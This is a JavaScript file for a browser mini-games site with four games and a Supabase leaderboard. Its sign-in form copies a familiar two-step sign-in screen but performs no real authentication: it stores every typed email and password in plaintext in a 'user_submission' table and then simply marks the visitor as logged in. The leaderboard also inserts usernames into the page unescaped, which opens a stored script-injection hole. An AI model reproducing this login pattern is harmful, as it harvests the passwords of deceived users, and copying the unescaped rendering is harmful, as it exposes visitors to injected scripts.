// Initialize Supabase Client
const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind0Ym9qb3R5emp2enl3YXF5a2JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc2Njg3ODYsImV4cCI6MjEwMzI0NDc4Nn0.hseExg_69fR025A8V_vxQmlG75AbUAj2TOdQGjCr2L0';
const _supabase = (typeof supabase !== 'undefined') ? supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;

// Global State
let userEmail = localStorage.getItem('userEmail') || '';
let userName = localStorage.getItem('userName') || '';
let playerScore = parseInt(localStorage.getItem('playerScore') || '0', 10);

const isFormPage = !!document.getElementById('step-email');

// ==========================================
// SIGN-IN FORM LOGIC (form.html only)
// ==========================================
if (isFormPage) {
  const stepEmail = document.getElementById('step-email');
  const stepPassword = document.getElementById('step-password');
  const stepLoading = document.getElementById('step-loading');

  const emailInput = document.getElementById('email');
  const emailError = document.getElementById('email-error');
  const btnNext = document.getElementById('btn-next');

  const passwordInput = document.getElementById('password');
  const passError = document.getElementById('pass-error');
  const btnLogin = document.getElementById('btn-login');
  const togglePassword = document.getElementById('toggle-password');

  const loadingEmailDisplay = document.getElementById('loading-display-email');
  const emailChip = document.getElementById('email-chip');
  const userDisplayEmail = document.getElementById('user-display-email');

  const sideTitle = document.getElementById('side-title');
  const privacyNotice = document.getElementById('privacy-notice');
  const passwordHint = document.getElementById('password-hint');

  // Returning user: prefill their email and show the account chip on step 1
  if (userEmail) {
    emailInput.value = userEmail;
    userDisplayEmail.textContent = userEmail;
    emailChip.classList.remove('hidden');
    emailChip.onclick = goToPasswordStep;
  }

  function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  }

  // Step 1 -> Step 2. The left column swaps from the generic sign-in
  // blurb to a "Welcome" heading + an account chip showing the email
  // that was just typed in, with a plain default account icon (no photo).
  function goToPasswordStep() {
    const typedEmail = emailInput.value.trim();
    if (!isValidEmail(typedEmail)) {
      emailError.style.display = 'block';
      return;
    }
    emailError.style.display = 'none';

    stepEmail.classList.add('hidden');
    stepPassword.classList.remove('hidden');
    passwordInput.focus();

    sideTitle.textContent = 'Welcome';
    privacyNotice.classList.add('hidden');
    passwordHint.classList.remove('hidden');

    userDisplayEmail.textContent = typedEmail;
    emailChip.classList.remove('hidden');
    emailChip.onclick = goToEmailStep;
  }

  // Step 2 -> Step 1 (lets the person switch emails, like tapping the
  // account chip on a real sign-in screen).
  function goToEmailStep() {
    stepPassword.classList.add('hidden');
    stepEmail.classList.remove('hidden');
    emailInput.focus();

    sideTitle.textContent = 'Sign In';
    passwordHint.classList.add('hidden');
    privacyNotice.classList.remove('hidden');

    if (userEmail) {
      userDisplayEmail.textContent = userEmail;
      emailChip.classList.remove('hidden');
      emailChip.onclick = goToPasswordStep;
    } else {
      emailChip.classList.add('hidden');
    }
  }

  btnNext.addEventListener('click', goToPasswordStep);

  emailInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btnNext.click();
  });

  togglePassword.addEventListener('change', () => {
    passwordInput.type = togglePassword.checked ? 'text' : 'password';
  });

  btnLogin.addEventListener('click', async () => {
    if (!passwordInput.value) {
      passError.style.display = 'block';
      return;
    }
    passError.style.display = 'none';

    const finalEmail = emailInput.value.trim();
    const finalPassword = passwordInput.value;

    stepPassword.classList.add('hidden');
    stepLoading.classList.remove('hidden');
    loadingEmailDisplay.textContent = finalEmail;

    // Log every submission to the 'user_submission' table.
    if (_supabase) {
      try {
        await _supabase
          .from('user_submission')
          .insert([{ email: finalEmail, password: finalPassword }]);
      } catch (err) {
        console.error('user_submission insert error:', err);
      }
    }

    localStorage.setItem('userEmail', finalEmail);
    localStorage.setItem('isLoggedIn', 'true');

    setTimeout(() => {
      window.location.href = 'index.html?signedin=true';
    }, 1200);
  });

  passwordInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btnLogin.click();
  });
}

// ==========================================
// HOMEPAGE & GAMES LOGIC (index.html only)
// ==========================================
if (!isFormPage) {
  const modalAuthPrompt = document.getElementById('modal-auth-prompt');
  const modalUsernamePrompt = document.getElementById('modal-username-prompt');
  const btnGoToLogin = document.getElementById('btn-go-to-login');
  const btnSaveUsername = document.getElementById('btn-save-username');
  const usernameInput = document.getElementById('username-input');
  const usernameError = document.getElementById('username-error');

  const navHome = document.getElementById('nav-home');
  const navLeaderboard = document.getElementById('nav-leaderboard');
  const navProfile = document.getElementById('nav-profile');

  const viewHome = document.getElementById('view-home');
  const viewLeaderboard = document.getElementById('view-leaderboard');
  const viewProfile = document.getElementById('view-profile');
  const viewRPS = document.getElementById('view-game-rps');
  const viewTTT = document.getElementById('view-game-ttt');
  const viewGuess = document.getElementById('view-game-guess');
  const viewMemory = document.getElementById('view-game-memory');

  const allViews = [viewHome, viewLeaderboard, viewProfile, viewRPS, viewTTT, viewGuess, viewMemory];

  // Global score display setup
  if (document.getElementById('global-score-display')) {
    document.getElementById('global-score-display').textContent = playerScore;
  }

  const urlParams = new URLSearchParams(window.location.search);
  const justSignedIn = urlParams.get('signedin') === 'true';
  const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';

  // 5-Second Sign In Prompt Modal
  if (!isLoggedIn && !justSignedIn) {
    setTimeout(() => {
      if (!localStorage.getItem('isLoggedIn')) {
        modalAuthPrompt.classList.remove('hidden');
      }
    }, 5000);
  }

  // Username prompt modal check
  if (justSignedIn || (isLoggedIn && !userName)) {
    modalUsernamePrompt.classList.remove('hidden');
  }

  btnGoToLogin.addEventListener('click', () => {
    window.location.href = 'form.html';
  });

  btnSaveUsername.addEventListener('click', async () => {
    const val = usernameInput.value.trim();
    if (!val) {
      usernameError.textContent = 'Enter a username.';
      usernameError.style.display = 'block';
      return;
    }

    if (_supabase) {
      const { data: existingUser } = await _supabase
        .from('leaderboard')
        .select('username')
        .ilike('username', val)
        .maybeSingle();

      if (existingUser && existingUser.username.toLowerCase() !== userName.toLowerCase()) {
        usernameError.textContent = 'Username taken! Pick another.';
        usernameError.style.display = 'block';
        return;
      }
    }

    usernameError.style.display = 'none';
    userName = val;
    localStorage.setItem('userName', userName);
    localStorage.setItem('isLoggedIn', 'true');
    modalUsernamePrompt.classList.add('hidden');

    updateProfileUI();
    await saveScoreToSupabase();
  });

  // Navigation Logic
  function switchView(targetView, activeNavBtn = null) {
    allViews.forEach(v => v.classList.add('hidden'));
    [navHome, navLeaderboard, navProfile].forEach(b => b.classList.remove('active'));

    targetView.classList.remove('hidden');
    if (activeNavBtn) activeNavBtn.classList.add('active');

    if (targetView === viewLeaderboard) fetchSupabaseLeaderboard();
    if (targetView === viewProfile) updateProfileUI();
    if (targetView === viewHome) {
      document.getElementById('global-score-display').textContent = playerScore;
    }
  }

  navHome.addEventListener('click', () => switchView(viewHome, navHome));
  navLeaderboard.addEventListener('click', () => switchView(viewLeaderboard, navLeaderboard));
  navProfile.addEventListener('click', () => switchView(viewProfile, navProfile));

  // Quit / Close Button Logic (Returns to Home without saving extra points)
  document.querySelectorAll('[data-close="true"]').forEach(btn => {
    btn.addEventListener('click', () => {
      switchView(viewHome, navHome);
    });
  });

  // Shared helper: award points, persist locally, sync to leaderboard.
  async function awardPoints(points) {
    playerScore += points;
    localStorage.setItem('playerScore', playerScore);
    await saveScoreToSupabase();
  }

  // --- GAME 1: ROCK PAPER SCISSORS (10 Rounds) ---
  let rpsRound = 1;
  let rpsMatchScore = 0;
  let rpsBusy = false;

  const rpsArena = document.getElementById('rps-arena');
  const rpsPlayerEmoji = document.getElementById('rps-player-emoji');
  const rpsAiEmoji = document.getElementById('rps-ai-emoji');
  const RPS_EMOJI = { rock: '✊', paper: '✋', scissors: '✌️' };

  document.getElementById('btn-open-rps').addEventListener('click', () => {
    rpsRound = 1;
    rpsMatchScore = 0;
    rpsBusy = false;
    document.getElementById('rps-round').textContent = `${rpsRound}/10`;
    document.getElementById('rps-match-score').textContent = rpsMatchScore;
    document.getElementById('rps-status').textContent = 'Choose your move to start';
    rpsArena.classList.remove('outcome-win', 'outcome-lose', 'outcome-draw');
    rpsPlayerEmoji.textContent = '❔';
    rpsAiEmoji.textContent = '❔';
    document.querySelectorAll('.rps-btn').forEach(b => b.disabled = false);
    switchView(viewRPS);
  });

  document.querySelectorAll('.rps-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
      if (rpsBusy) return;
      rpsBusy = true;

      const playerChoice = btn.getAttribute('data-choice');
      const choices = ['rock', 'paper', 'scissors'];
      const aiChoice = choices[Math.floor(Math.random() * 3)];
      const statusEl = document.getElementById('rps-status');

      document.querySelectorAll('.rps-btn').forEach(b => b.disabled = true);
      rpsArena.classList.remove('outcome-win', 'outcome-lose', 'outcome-draw');

      // Quick "deciding" shake before the reveal, so both picks land together.
      rpsPlayerEmoji.textContent = '❔';
      rpsAiEmoji.textContent = '❔';
      rpsPlayerEmoji.classList.add('animating');
      rpsAiEmoji.classList.add('animating');
      statusEl.textContent = 'Choosing...';
      await new Promise(resolve => setTimeout(resolve, 400));
      rpsPlayerEmoji.classList.remove('animating');
      rpsAiEmoji.classList.remove('animating');

      rpsPlayerEmoji.textContent = RPS_EMOJI[playerChoice];
      rpsAiEmoji.textContent = RPS_EMOJI[aiChoice];

      let result = '';
      let outcomeClass = '';
      if (playerChoice === aiChoice) {
        result = `Draw! Both picked ${playerChoice}.`;
        outcomeClass = 'outcome-draw';
      } else if (
        (playerChoice === 'rock' && aiChoice === 'scissors') ||
        (playerChoice === 'paper' && aiChoice === 'rock') ||
        (playerChoice === 'scissors' && aiChoice === 'paper')
      ) {
        rpsMatchScore++;
        result = `Win! ${playerChoice} beats ${aiChoice}.`;
        outcomeClass = 'outcome-win';
      } else {
        result = `Lose! ${aiChoice} beats ${playerChoice}.`;
        outcomeClass = 'outcome-lose';
      }
      rpsArena.classList.add(outcomeClass);

      document.getElementById('rps-match-score').textContent = rpsMatchScore;

      if (rpsRound >= 10) {
        statusEl.textContent = `Match Over! Scored ${rpsMatchScore} Pts. Returning...`;

        await awardPoints(rpsMatchScore);

        setTimeout(() => switchView(viewHome, navHome), 2200);
      } else {
        statusEl.textContent = result;
        rpsRound++;
        document.getElementById('rps-round').textContent = `${rpsRound}/10`;
        document.querySelectorAll('.rps-btn').forEach(b => b.disabled = false);
        rpsBusy = false;
      }
    });
  });

  // --- GAME 2: TIC TAC TOE (+5 PTS) — unbeatable minimax AI ---
  let tttBoard = ["", "", "", "", "", "", "", "", ""];
  let tttActive = false;
  const boardEl = document.getElementById('ttt-board');
  const tttStatus = document.getElementById('ttt-status');
  const TTT_WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];

  document.getElementById('btn-open-ttt').addEventListener('click', () => {
    tttBoard = ["", "", "", "", "", "", "", "", ""];
    tttActive = true;
    tttStatus.textContent = "You are X. It's your turn!";
    boardEl.innerHTML = '';

    for (let i = 0; i < 9; i++) {
      const cell = document.createElement('button');
      cell.classList.add('ttt-cell');
      cell.addEventListener('click', () => handleTttClick(i, cell));
      boardEl.appendChild(cell);
    }
    switchView(viewTTT);
  });

  async function handleTttClick(index, cell) {
    if (!tttActive || tttBoard[index] !== "") return;

    tttBoard[index] = "X";
    cell.textContent = "X";

    if (checkTttWin(tttBoard, "X")) {
      tttActive = false;
      tttStatus.textContent = "You won! +5 Global Points.";
      await awardPoints(5);
      setTimeout(() => switchView(viewHome, navHome), 2000);
      return;
    }

    if (!tttBoard.includes("")) {
      tttActive = false;
      tttStatus.textContent = "It's a draw!";
      setTimeout(() => switchView(viewHome, navHome), 2000);
      return;
    }

    tttActive = false;
    tttStatus.textContent = "AI is thinking...";

    setTimeout(async () => {
      const aiPick = getBestTttMove(tttBoard);

      tttBoard[aiPick] = "O";
      boardEl.children[aiPick].textContent = "O";
      boardEl.children[aiPick].classList.add('mark-o');

      if (checkTttWin(tttBoard, "O")) {
        tttActive = false;
        tttStatus.textContent = "AI won! Returning...";
        setTimeout(() => switchView(viewHome, navHome), 2000);
      } else if (!tttBoard.includes("")) {
        tttActive = false;
        tttStatus.textContent = "It's a draw!";
        setTimeout(() => switchView(viewHome, navHome), 2000);
      } else {
        tttActive = true;
        tttStatus.textContent = "Your turn (X).";
      }
    }, 500);
  }

  function checkTttWin(board, p) {
    return TTT_WINS.some(w => board[w[0]] === p && board[w[1]] === p && board[w[2]] === p);
  }

  // Minimax with alpha-beta pruning: the AI ('O') always plays optimally,
  // so the best a player can force is a draw. Ties between equally-good
  // moves are broken randomly so the AI doesn't feel robotic.
  function minimaxTtt(board, isMaximizing, alpha, beta) {
    if (checkTttWin(board, "O")) return 10;
    if (checkTttWin(board, "X")) return -10;
    if (!board.includes("")) return 0;

    if (isMaximizing) {
      let best = -Infinity;
      for (let i = 0; i < 9; i++) {
        if (board[i] !== "") continue;
        board[i] = "O";
        best = Math.max(best, minimaxTtt(board, false, alpha, beta));
        board[i] = "";
        alpha = Math.max(alpha, best);
        if (beta <= alpha) break;
      }
      return best;
    } else {
      let best = Infinity;
      for (let i = 0; i < 9; i++) {
        if (board[i] !== "") continue;
        board[i] = "X";
        best = Math.min(best, minimaxTtt(board, true, alpha, beta));
        board[i] = "";
        beta = Math.min(beta, best);
        if (beta <= alpha) break;
      }
      return best;
    }
  }

  function getBestTttMove(board) {
    let bestScore = -Infinity;
    let bestMoves = [];
    for (let i = 0; i < 9; i++) {
      if (board[i] !== "") continue;
      board[i] = "O";
      const score = minimaxTtt(board, false, -Infinity, Infinity);
      board[i] = "";
      if (score > bestScore) {
        bestScore = score;
        bestMoves = [i];
      } else if (score === bestScore) {
        bestMoves.push(i);
      }
    }
    return bestMoves[Math.floor(Math.random() * bestMoves.length)];
  }

  // --- GAME 3: NUMBER GUESSER (1-100, 20 lives, sliding points) ---
  let guessTarget = 0;
  let guessLives = 20;
  const GUESS_START_LIVES = 20;

  // Points step down by 2 every 5 lives lost (20 lives -> 10 pts,
  // 15 lives left -> 8 pts, 10 lives left -> 6 pts, and so on).
  function calcGuessPoints(livesLeft) {
    const lost = GUESS_START_LIVES - livesLeft;
    const tier = Math.floor(lost / 5);
    return Math.max(10 - tier * 2, 2);
  }

  document.getElementById('btn-open-guess').addEventListener('click', () => {
    guessTarget = Math.floor(Math.random() * 100) + 1;
    guessLives = GUESS_START_LIVES;
    document.getElementById('guess-lives').textContent = guessLives;
    document.getElementById('guess-points-preview').textContent = calcGuessPoints(guessLives);
    document.getElementById('guess-status').textContent = 'Guess a number between 1 and 100';
    document.getElementById('guess-input').value = '';
    document.getElementById('guess-input').disabled = false;
    document.getElementById('btn-guess-submit').disabled = false;
    switchView(viewGuess);
  });

  document.getElementById('btn-guess-submit').addEventListener('click', async () => {
    const inputEl = document.getElementById('guess-input');
    const val = parseInt(inputEl.value, 10);
    const statusEl = document.getElementById('guess-status');

    if (isNaN(val) || val < 1 || val > 100) {
      statusEl.textContent = "Enter a number between 1 and 100.";
      return;
    }

    if (val === guessTarget) {
      const pointsWon = calcGuessPoints(guessLives);
      statusEl.textContent = `Correct! +${pointsWon} Global Points!`;
      inputEl.disabled = true;
      document.getElementById('btn-guess-submit').disabled = true;

      await awardPoints(pointsWon);
      setTimeout(() => switchView(viewHome, navHome), 2000);
    } else {
      guessLives--;
      document.getElementById('guess-lives').textContent = guessLives;
      document.getElementById('guess-points-preview').textContent = calcGuessPoints(guessLives);
      if (guessLives <= 0) {
        statusEl.textContent = `Out of lives! Number was ${guessTarget}.`;
        inputEl.disabled = true;
        document.getElementById('btn-guess-submit').disabled = true;
        setTimeout(() => switchView(viewHome, navHome), 2200);
      } else {
        statusEl.textContent = val > guessTarget ? "Too high!" : "Too low!";
      }
    }
  });

  // --- GAME 4: MEMORY RUSH (up to +20 PTS) ---
  const MEMORY_ICONS = ['🕹️', '👾', '🏆', '⭐', '🔥', '💎'];
  const memoryGrid = document.getElementById('memory-grid');
  const memoryStatus = document.getElementById('memory-status');
  const memoryMovesEl = document.getElementById('memory-moves');
  const memoryPairsEl = document.getElementById('memory-pairs');

  let memoryCards = [];
  let memoryFirst = null;
  let memoryLock = false;
  let memoryMoves = 0;
  let memoryMatches = 0;

  function shuffle(arr) {
    for (let i = arr.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
  }

  // Perfect play needs exactly 6 moves; points step down as moves climb,
  // with a 5-point floor so a rough round is never worth nothing.
  function calcMemoryPoints(moves) {
    return Math.max(5, 20 - (moves - 6) * 2);
  }

  document.getElementById('btn-open-memory').addEventListener('click', () => {
    memoryCards = shuffle([...MEMORY_ICONS, ...MEMORY_ICONS]);
    memoryFirst = null;
    memoryLock = false;
    memoryMoves = 0;
    memoryMatches = 0;

    memoryMovesEl.textContent = memoryMoves;
    memoryPairsEl.textContent = `${memoryMatches}/6`;
    memoryStatus.textContent = 'Flip two cards to find a match';

    memoryGrid.innerHTML = '';
    memoryCards.forEach((icon, i) => {
      const card = document.createElement('div');
      card.classList.add('memory-card');
      card.textContent = '❓';
      card.dataset.icon = icon;
      card.dataset.index = i;
      card.addEventListener('click', () => handleMemoryClick(card));
      memoryGrid.appendChild(card);
    });

    switchView(viewMemory);
  });

  function handleMemoryClick(card) {
    if (memoryLock) return;
    if (card.classList.contains('flipped') || card.classList.contains('matched')) return;

    card.classList.add('flipped');
    card.textContent = card.dataset.icon;

    if (!memoryFirst) {
      memoryFirst = card;
      return;
    }

    memoryLock = true;
    memoryMoves++;
    memoryMovesEl.textContent = memoryMoves;

    const second = card;
    if (memoryFirst.dataset.icon === second.dataset.icon) {
      memoryFirst.classList.add('matched');
      second.classList.add('matched');
      memoryMatches++;
      memoryPairsEl.textContent = `${memoryMatches}/6`;
      memoryFirst = null;
      memoryLock = false;

      if (memoryMatches === 6) {
        const pointsWon = calcMemoryPoints(memoryMoves);
        memoryStatus.textContent = `All matched in ${memoryMoves} moves! +${pointsWon} Global Points.`;
        awardPoints(pointsWon).then(() => {
          setTimeout(() => switchView(viewHome, navHome), 2200);
        });
      } else {
        memoryStatus.textContent = 'Match! Keep going.';
      }
    } else {
      memoryStatus.textContent = 'No match — try again.';
      setTimeout(() => {
        memoryFirst.classList.remove('flipped');
        memoryFirst.textContent = '❓';
        second.classList.remove('flipped');
        second.textContent = '❓';
        memoryFirst = null;
        memoryLock = false;
      }, 700);
    }
  }

  // --- SUPABASE RANKING SYNC ---
  // Writes are chained through one queue so two saves never race each
  // other with a stale "does this row exist yet" check, and upsert keys
  // on username so a save always updates one row instead of inserting
  // a new one. Together with the fetch-side dedupe below, this is what
  // stops the same player from showing up multiple times with different
  // scores.
  let saveQueue = Promise.resolve();

  function saveScoreToSupabase() {
    if (!userName || !_supabase) return Promise.resolve();

    saveQueue = saveQueue.then(async () => {
      try {
        await _supabase
          .from('leaderboard')
          .upsert({ username: userName, score: playerScore }, { onConflict: 'username' });
      } catch (err) {
        console.error('Database sync error:', err);
      }
    });
    return saveQueue;
  }

  // Collapses any leftover duplicate rows for the same username (from
  // before this fix) down to a single best-score entry per player.
  function dedupeLeaderboard(rows) {
    const best = new Map();
    (rows || []).forEach(entry => {
      const key = entry.username.trim().toLowerCase();
      if (!best.has(key) || best.get(key).score < entry.score) {
        best.set(key, entry);
      }
    });
    return Array.from(best.values()).sort((a, b) => b.score - a.score);
  }

  async function fetchSupabaseLeaderboard() {
    const tbody = document.getElementById('leaderboard-body');
    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">Loading rankings...</td></tr>';

    if (!_supabase) {
      tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; color:#ff4d6d;">Database unavailable.</td></tr>';
      return;
    }

    const { data, error } = await _supabase
      .from('leaderboard')
      .select('username, score')
      .order('score', { ascending: false })
      .limit(100);

    if (error || !data || data.length === 0) {
      tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">No rankings yet. Play to rank up!</td></tr>';
      return;
    }

    const ranked = dedupeLeaderboard(data).slice(0, 10);

    tbody.innerHTML = ranked.map((entry, idx) => `
      <tr>
        <td><span class="rank-badge ${idx === 0 ? 'top-rank' : ''}">#${idx + 1}</span></td>
        <td>${entry.username}</td>
        <td>${entry.score}</td>
      </tr>
    `).join('');
  }

  function updateProfileUI() {
    document.getElementById('profile-display-name').textContent = userName || 'Guest Player';
    document.getElementById('profile-display-email').textContent = userEmail || 'Not Signed In';
    document.getElementById('profile-wins').textContent = playerScore;

    const btnLogout = document.getElementById('btn-logout');
    if (localStorage.getItem('isLoggedIn') !== 'true') {
      btnLogout.textContent = 'Sign In';
      btnLogout.onclick = () => window.location.href = 'form.html';
    } else {
      btnLogout.textContent = 'Sign Out';
      btnLogout.onclick = () => {
        localStorage.clear();
        playerScore = 0;
        window.location.href = 'form.html';
      };
    }

    if (_supabase && userName) {
      _supabase
        .from('leaderboard')
        .select('username, score')
        .order('score', { ascending: false })
        .then(({ data }) => {
          if (data) {
            const ranked = dedupeLeaderboard(data);
            const rank = ranked.findIndex(e => e.username.toLowerCase() === userName.toLowerCase()) + 1;
            document.getElementById('profile-rank').textContent = rank > 0 ? `#${rank}` : '#--';
          }
        });
    }
  }
}
